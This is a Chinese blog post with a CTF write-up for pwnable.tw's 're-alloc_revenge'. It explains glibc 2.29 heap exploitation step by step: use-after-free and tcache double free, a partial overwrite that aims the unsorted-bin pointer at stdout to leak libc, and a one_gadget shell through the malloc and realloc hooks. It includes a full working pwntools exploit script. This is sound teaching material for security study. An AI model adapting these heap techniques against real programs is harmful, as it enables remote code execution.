<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>pwn heap: re-alloc_revenge | Nop</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop" type="application/atom+xml">
</head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">Nop</a></h1></div><p class="m-desc">There is a long way to go</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">Archives</a></li><li><span class="dot">●</span><a href="/categories/">Categories</a></li><li><span class="dot">●</span><a href="/tags/">Tags</a></li><li><span class="dot">●</span><a href="/about/">About</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="Search" onfocus="if(this.value=='Search'){this.value='';}" onblur="if(this.value==''){this.value='Search';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">pwn heap: re-alloc_revenge</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/03/18/pwn-heap-re-alloc-revenge/">2020-03-18</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/Writeup/">Writeup</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>和re-alloc一样，只不过开了PIE和RELRO，got表改不了了，要利用stdout结构体来leak libc，因为第一次做，而且过程稍微有些复杂，所以记录一下。</p>
<blockquote>
<p>题目描述</p>
</blockquote>
<p>pwnable.tw上的一道题，也就是在re-alloc上保护全开。</p>
<pre><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
FORTIFY:  Enabled</code></pre><p>功能就不赘述了，因为binary和re-alloc一摸一样。</p>
<blockquote>
<p>相关知识点</p>
</blockquote>
<h2 id="利用stdout结构体leak-libc"><a href="#利用stdout结构体leak-libc" class="headerlink" title="利用stdout结构体leak libc"></a>利用stdout结构体leak libc</h2><p>当binary使用过puts函数时，会依照以下调用链调用到<code>_IO_new_file_overflow</code>:</p>
<pre><code class="C">_IO_puts --&gt; _IO_sputn --&gt; _IO_new_file_xsputn --&gt; _IO_new_file_overflow </code></pre>
<p>分析<code>_IO_new_file_overflow</code>源码：</p>
<pre><code class="C">int _IO_new_file_overflow (FILE *f, int ch)
{
    // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_NO_WRITES&quot;
    if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */
    {
        f-&gt;_flags |= _IO_ERR_SEEN;
        __set_errno (EBADF);
        return EOF;
    }   
    // 跳过这个if分支，需要设置&quot;fp-&gt;_flags | _IO_CURRENTLY_PUTTING&quot;
    if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)
    {
        /* Allocate a buffer if needed. */
        if (f-&gt;_IO_write_base == NULL)
        {
            _IO_doallocbuf (f);
            _IO_setg (f, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base, f-&gt;_IO_buf_base);
        }

        if (__glibc_unlikely (_IO_in_backup (f)))
        {
            size_t nbackup = f-&gt;_IO_read_end - f-&gt;_IO_read_ptr;
            _IO_free_backup_area (f);
            f-&gt;_IO_read_base -= MIN (nbackup, f-&gt;_IO_read_base - f-&gt;_IO_buf_base);
            f-&gt;_IO_read_ptr = f-&gt;_IO_read_base;
        }

        if (f-&gt;_IO_read_ptr == f-&gt;_IO_buf_end)
            f-&gt;_IO_read_end = f-&gt;_IO_read_ptr = f-&gt;_IO_buf_base;
        f-&gt;_IO_write_ptr = f-&gt;_IO_read_ptr;
        f-&gt;_IO_write_base = f-&gt;_IO_write_ptr;
        f-&gt;_IO_write_end = f-&gt;_IO_buf_end;
        f-&gt;_IO_read_base = f-&gt;_IO_read_ptr = f-&gt;_IO_read_end;

        f-&gt;_flags |= _IO_CURRENTLY_PUTTING;
        if (f-&gt;_mode &lt;= 0 &amp;&amp; f-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED))
            f-&gt;_IO_write_end = f-&gt;_IO_write_ptr;
    }
    if (ch == EOF)
        // 需要调用的目标&quot;_IO_do_write&quot;，如果使得 _IO_write_base &lt; _IO_write_ptr，且 _IO_write_base 处
        // 存在有价值的地址 （libc 地址）则可进行泄露
        // 在正常情况下，_IO_write_base == _IO_write_ptr 且位于 libc 中，所以可进行部分写(覆盖&quot;_IO_write_base&quot;低字节为&quot;\x00&quot;)
        return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);
    if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */
        if (_IO_do_flush (f) == EOF)
            return EOF;
    *f-&gt;_IO_write_ptr++ = ch;
    if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == &#39;\n&#39;))
        if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) 
            return EOF;
    return (unsigned char) ch;
}</code></pre>
<p>在<code>_IO_new_file_overflow</code>中，我们要利用的就是其中的<code>_IO_do_write</code>。<br><br>在输出时，如果具有缓冲区，会输出<code>_IO_write_base</code>开始的缓冲区内容，直到<code>_IO_write_ptr</code>（也就是将<code>_IO_write_base</code>一直到<code>_IO_write_ptr</code>部分的值当做缓冲区，在无缓冲区时，两个指针指向同一位置，位于该结构体附近，也就是libc中），但是在<code>setbuf</code>后，理论上会不使用缓冲区。然而如果能够修改<code>_IO_2_1_stdout_</code>结构体的<code>flags</code>部分，使得其认为<code>stdout</code>具有缓冲区，再将<code>_IO_write_base</code>处的值进行<code>partial overwrite</code>，就可以泄露出libc地址了。<br><br>为了设置对应的<code>flags</code>的值，需要进一步分析<code>_IO_do_write</code>(其实就是<code>_IO_new_do_write</code>)：</p>
<pre><code class="C">int _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
{
    return (to_do == 0 || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
}

static size_t new_do_write (FILE *fp, const char *data, size_t to_do)
{
    size_t count;
    if (fp-&gt;_flags &amp; _IO_IS_APPENDING)
        fp-&gt;_offset = _IO_pos_BAD;
    else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)
    {
        // &quot;_IO_SYSSEEK&quot;只是简单的调用lseek，但是我们不能完全控制&quot;fp-&gt;_IO_write_base - fp-&gt;_IO_read_end&quot;的值。
        // 如果&quot;fp-&gt;_IO_read_end&quot;的值设置为0，那么&quot;_IO_SYSSEEK&quot;的第二个参数值就会过大;
        // 如果设置&quot;fp-&gt;_IO_write_base = fp-&gt;_IO_read_end&quot;的话，那么在其它地方就会有问题，因为&quot;fp-&gt;_IO_write_base&quot;不能大于&quot;fp-&gt;_IO_write_end&quot;。
        // 所以这里要设置&quot;fp-&gt;_flags | _IO_IS_APPENDING&quot;，避免进入else if分支。
        off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1);
        if (new_pos == _IO_pos_BAD)
            return 0;
        fp-&gt;_offset = new_pos;
    }
    // 需要的目标&quot;_IO_SYSWRITE&quot;
    count = _IO_SYSWRITE (fp, data, to_do);
    if (fp-&gt;_cur_column &amp;&amp; count)
        fp-&gt;_cur_column = _IO_adjust_column (fp-&gt;_cur_column - 1, data, count) + 1;
    _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);
    fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_buf_base;
    fp-&gt;_IO_write_end = (fp-&gt;_mode &lt;= 0 &amp;&amp; (fp-&gt;_flags &amp; (_IO_LINE_BUF | _IO_UNBUFFERED)) ? fp-&gt;_IO_buf_base : fp-&gt;_IO_buf_end);
    return count;
}</code></pre>
<p>综上可以得到，<code>flags</code>需要满足的条件为：</p>
<pre><code class="C">_flags = 0xfbad0000                 // Magic number
_flags &amp; = ~_IO_NO_WRITES           // _flags = 0xfbad0000
_flags | = _IO_CURRENTLY_PUTTING    // _flags = 0xfbad0800
_flags | = _IO_IS_APPENDING         // _flags = 0xfbad1800</code></pre>
<p>同时可以将<code>_IO_read_ptr</code>, <code>_IO_read_end</code>, <code>_IO_read_base</code>, <code>_IO_write_base</code>设置为：</p>
<pre><code class="C">_IO_read_ptr = 0;
_IO_read_end = 0;
_IO_read_base = 0;
_IO_write_base = 0x7fXXXXXXXX00;</code></pre>
<p>然后就可以根据输出的数据leak出libc地址了。</p>
<blockquote>
<p>利用思路</p>
</blockquote>
<ul>
<li>利用<code>alloc</code>功能在<code>size=0</code>时存在的uaf，以及<code>realloc</code>中当<code>size &lt; old_size</code>而触发的<code>free(remainder)</code>操作，形成chunk overlap，然后覆盖chunk的size至足够放进unsorted bin中（这里因为要爆破而且连远程的延迟比较大，所以尽量小）。</li>
<li>为了保证能够顺利地将chunk放进unsorted bin中，需要绕过这里的检查，也就是需要先free掉足够大小的chunk，保证该需要放进unsorted bin的nextchunk的prev_inuse area为1。由于每次分配最大的size为0x78也就是chunk的size最大为0x80，这里要进行多次的<code>alloc(0x68)</code>, <code>realloc(0x78)</code>, <code>free()</code>操作（为了防止tcache中刚被free掉的chunk又被取出来）。直到nextchunk正好指向size为0x80的fastbin。<pre><code class="C">if (__glibc_unlikely (!prev_inuse(nextchunk)))
  malloc_printerr (&quot;double free or corruption (!prev)&quot;);</code></pre>
</li>
<li>此外，由于后续的操作需要保持unsorted bin中和tcache bin中同时存在该伪造的unsorted bin，从而能从该tcache中分配到位于<code>stdout</code>结构体的内存，所以要在前面提到的<code>free(remainder)</code>形成的tcache bin初形成该chunk的double free，从而在分配该处的chunk时仍能将它保留在tcache中。<pre><code>tcache bin ==&gt; +--------+ &lt;--victim_chunk                      tcache bin ==&gt; +--------+&lt;--same victim_chunk
             |        |                   after malloc                      |        |
             +--------+&lt;--+            ===================&gt;                 +--------+
             |fd |    |   |                                                 |        |
             +--------+   |                                                 +--------+
               |          |
               +----------+</code></pre></li>
<li>进一步地，由于<code>alloc</code>会对输入地字符串强制添加末尾<code>\x00</code>，从而会将上一步中提到的double free链（也就是该tache bin的fd）的低字节覆盖为<code>\x00</code>，这里需要将该chunk的地址保持为低字节是<code>\x00</code>，从而即使低字节被覆盖也不影响double free链，而做法就是在最开始得时候分配一定size的chunk并free到tcache中去（其实这里的chunk在最后的exploite也会用到，因为那时unsorted bin已经被破坏了，不能分配tcache或者fastbin中没有的chunk，否则会造成从unsorted bin中取而报错）。</li>
<li>在伪造好相应的chunk后，分配并释放到unsorted bin中，再用uaf进行partial overwrite <code>unsorted bin-&gt;fd</code>为<code>stdout</code>(bruteforce 4 bits)，然后再从相应tcache bin中取出该chunk，使得tcache bin指向stdout<pre><code class="shell">tcache bin ==&gt; +--------+ &lt;--victim_chunk             |
             |        |                               |
             +--------+                               |
             |fd |    |                               |
             +--------+                               |
               |                                      |
               +----------&gt; +--------+ &lt;--stdout      |
                            |_flags  |                |
                            +--------+                |
                            |        |                |
                            +--------+                |   after malloc
----------------------------------------------------- +  =============&gt; tcache bin ==&gt; +--------+ &lt;--stdout
unsorted bin ==&gt; +--------+ &lt;--same victim_chunk      |                                |_flags  |
               |        |                             |                                +--------+
               +--------+                             |                                |        |
               |fd | bk |--------&gt; main_arena         |                                +--------+        
               +--------+                             |                         
                 |                                    |
                 +----------&gt; +--------+ &lt;--stdout    |
                              |_flags  |              |
                              +--------+              |
                              |        |              |
                              +--------+              |                  </code></pre>
</li>
<li>这个时候只要分配stdout出的chunk就能修改相应的stdout结构体，达到输出数据从而leak libc的目的。</li>
<li>之后因为unsorted bin被破坏的缘故，并且仅能使用一个heap进行exploite（另一个heap不能被free，否则会报错）和只能通过bins中已有的chunk进行利用，分配到<code>__realloc_hook</code>处的chunk，将<code>__realloc_hook</code>改为<code>malloc</code>，再将<code>__malloc_hook</code>改为<code>one_gadget</code>（为了调整栈帧，使得<code>[rsp + 0x70] == NULL</code>。</li>
<li>触发<code>realloc</code>来getshell。</li>
</ul>
<blockquote>
<p>exp</p>
</blockquote>
<pre><code class="python"># context.log_level = &quot;debug&quot;

def alloc(index, size, data):
    p.sendlineafter(&quot;Your choice: &quot;, &quot;1&quot;)
    p.sendlineafter(&quot;Index:&quot;, str(index))
    p.sendlineafter(&quot;Size:&quot;, str(size))
    p.sendafter(&quot;Data:&quot;, data)

def realloc(index, size, data):
    p.sendlineafter(&quot;Your choice: &quot;, &quot;2&quot;)
    p.sendlineafter(&quot;Index:&quot;, str(index))
    p.sendlineafter(&quot;Size:&quot;, str(size))
    if size != 0:
        p.sendafter(&quot;Data:&quot;, data)

def free(index):
    p.sendlineafter(&quot;Your choice: &quot;, &quot;3&quot;)
    p.sendlineafter(&quot;Index:&quot;, str(index))

offset = 0x1e7570
realloc_hook_offset = libc.symbols[&quot;__realloc_hook&quot;]
malloc_offset = libc.symbols[&quot;malloc&quot;]
one_gadget_offset = 0x106ef8

while True:
    try:
        # make the lowest byte of bins[1]&#39;s address be \x00
        # also provide chunks for exploite since at the very end the unsorted bin is broken, we can only use the chunk in the tcache
        alloc(0, 0x28, &quot;AAAA&quot;)
        free(0)
        alloc(0, 0x48, &quot;AAAA&quot;)
        free(0)

        # three freed tcache bins size = [0x60, 0x40, 0x20]
        # bins[0] and bins[2] have the same address (both size area are 0x20)
        # bins[1] is right next to bins[0] and bins[2]
        alloc(0, 0x58, &quot;AAAA&quot;)
        realloc(0, 0, &quot;&quot;)
        realloc(0, 0x18, &quot;BBBB&quot;)
        free(0)

        # make double free on bins[1]
        # thus we can use two same chunk on size 0x40 for the following exploit
        alloc(0, 0x38, &quot;AAAA&quot;)
        realloc(0, 0, &quot;&quot;)
        alloc(1, 0x38, &quot;BBBB&quot;)
        free(0)
        realloc(1, 0x38, &quot;B&quot; * 0x10)
        free(1)

        # alloc space for unsorted bin
        # make fake unstored bin&#39;s next chunk point to exactly a valid chunk
        # free 10 chunks(actually only 9 can be seen in the bins while debugging, why?)
        for i in range(9):
            alloc(1, 0x68, &quot;AAAA&quot;)
            realloc(1, 0x78, &quot;AAAA&quot;)
            free(1)

        # alloc bins[0] to overwrite the size area of bins[1] into 0x441(8 * 0x80 + 0x40 + 0x1)
        # then alloc bins[1] and free it to unsorted bin
        alloc(0, 0x58, &quot;D&quot; * 0x18 + p64(0x441))
        free(0)
        alloc(1, 0x38, &quot;DDDD&quot;)
        realloc(1, 0, &quot;&quot;)

        # partially write the unsorted bin-&gt;fd into stdout(bruteforce 4 bits)
        # make the tcache bins whose size is 0x40 point to stdout
        realloc(1, 0x38, p16(0x5760))
        alloc(0, 0x38, &quot;DDDD&quot;)

        # alloc the chunk at stdout
        # make _flags = 0x7fdf0ec12760 ... to invoke data print
        # _flags = MAGIC                    # 0xfbad0000 
        # _flags &amp;= ~_IO_NO_WRITES          # _flags = 0xfbad0000 
        # _flags |= _IO_CURRENTLY_PUTTING   # _flags = 0xfbad0800
        # _flags |= _IO_IS_APPENDING        # _flags = 0xfbad1800
        # _IO_read_ptr = 0, 
        # _IO_read_end = 0, 
        # _IO_read_base = 0
        # _IO_write_base = 0x7ffff7dd0700
        # _IO_write_ptr = 0x7ffff7dd07e3
        # thus data between _IO_write_base and _IO_write_ptr will be print out
        realloc(0, 0x18, &quot;AAAA&quot;)
        free(0)
        alloc(0, 0x38, p64(0xfbad1800) + p64(0) * 3)

        # leak libc
        string = p.recv(16)
        print(string)
        if string[0] == &quot;$&quot;:
            p.close()
            if _pwn_remote == 0:
                p = process(argv=[_proc], env=_setup_env())
            else:
                p = remote(&#39;chall.pwnable.tw&#39;, 10310)
            if _debug != 0:
                gdb.attach(p)
            continue

        libc_addr = u64(string[8:])
        libc_base = libc_addr - offset
        realloc_hook = libc_base + realloc_hook_offset
        libc_malloc = libc_base + malloc_offset
        one_gadget = libc_base + one_gadget_offset

        break

    except:
        p.close()
        if _pwn_remote == 0:
            p = process(argv=[_proc], env=_setup_env())
        else:
            p = remote(&#39;chall.pwnable.tw&#39;, 10310)
        if _debug != 0:
            gdb.attach(p)


success(&quot;libc_base: &quot; + hex(libc_base))
success(&quot;realloc_hook: &quot; + hex(realloc_hook))
success(&quot;libc_malloc: &quot; + hex(libc_malloc))
success(&quot;one_gadget: &quot; + hex(one_gadget))

# make heap[1] == NULL (cannot use heap[0] any more)
realloc(1, 0x18, &quot;A&quot; * 0x10)
free(1)

# use the 0x80 tcache and prepared tcache
# create three tcache bins = [0x80, 0x50, 0x30], bins[0] and bins[2] are the same (0x30)
alloc(1, 0x78, &quot;AAAA&quot;)
realloc(1, 0, &quot;&quot;)
realloc(1, 0x28, &quot;BBBB&quot;)
free(1)

# use bins[2] to overwrite the size area and fd of bins[1] to  0x51 and realloc_hook_addr
alloc(1, 0x78, &quot;A&quot; * 0x28 + p64(0x51) + p64(realloc_hook))
realloc(1, 0x18, &quot;AAAA&quot;)
free(1)

# make tcache bins in size 0x50 point to realloc_hook
alloc(1, 0x48, &quot;AAAA&quot;)
realloc(1, 0x18, &quot;BBBB&quot;)
free(1)

# make realloc_hook = malloc, malloc_hook = one_gadget
# then the call will be realloc ==&gt; realloc_hook(malloc) ==&gt; malloc_hook(one_gadget)
# because three &quot;push&quot;&#39;s in malloc will help to satisfy the one_gadget condition that [rsp + 0x70] == NULL 
alloc(1, 0x48, p64(libc_malloc) + p64(one_gadget))

# use realloc to trigger
realloc(1, 0, &quot;&quot;)

# use vps to get flag
# p.sendline(&quot;cat /home/re-alloc_revenge/flag&quot;)
# print(p.recv())

p.interactive()</code></pre>
<blockquote>
<p>小结</p>
</blockquote>
<ul>
<li>新姿势，<code>unsorted bin-&gt;fd</code>的partial overwrite改成<code>stdout</code>，在没有show的情况下进行leak libc</li>
<li>只有两个heap外加只有realloc操作再加各种崩坏的unsorted bin和tcache double free check，以及需要bruteforce，调试+写exp的过程对我来说那叫一个…</li>
<li>貌似还有一种改tcache struct的做法，目前还没研究，以后有时间搞一下</li>
</ul>
<blockquote>
<p>参考资料</p>
</blockquote>
<ol>
<li>思路来源，但是貌似这个脚本有问题：<a href="http://www.ntype.club/re-alloc_revenge/" target="_blank" rel="noopener">http://www.ntype.club/re-alloc_revenge/</a></li>
<li>改tcache stuct的做法（还没学着调过）：<a href="https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/" target="_blank" rel="noopener">https://sh1ner.github.io/2020/02/05/pwnable-tw-re-alloc-revenge/</a></li>
<li>利用stdout进行输出：<a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/tcache_attack-zh.md</a></li>
<li>同上：<a href="https://n0va-scy.github.io/2019/09/21/IO_FILE/" target="_blank" rel="noopener">https://n0va-scy.github.io/2019/09/21/IO_FILE/</a></li>
<li>glibc2.29源码：<a href="https://elixir.bootlin.com/glibc/glibc-2.29/source" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source</a></li>
</ol>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">Nop</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/03/18/pwn-heap-re-alloc-revenge/">http://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://n0nop.com">Nop的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CTF/">CTF</a><a href="/tags/pwn/">pwn</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2020/03/06/pwn-heap-re-alloc/">pwn heap: re-alloc &gt;</a></div></section><footer><p>Copyright © 2016 - 2020 <a href="/." rel="nofollow">Nop</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>